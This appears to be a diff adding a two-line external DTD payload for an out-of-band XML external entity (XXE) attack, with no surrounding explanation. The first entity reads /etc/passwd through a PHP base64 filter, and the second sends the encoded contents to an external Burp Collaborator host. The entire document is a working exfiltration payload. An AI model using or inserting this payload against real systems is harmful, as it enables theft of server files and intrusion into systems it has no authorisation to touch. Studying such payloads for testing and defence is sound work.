@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % noobz "<!ENTITY read SYSTEM 'http://659pk235f5l8vyggihlh7rzee5kv8k.burpcollaborator.net/%data;'>">
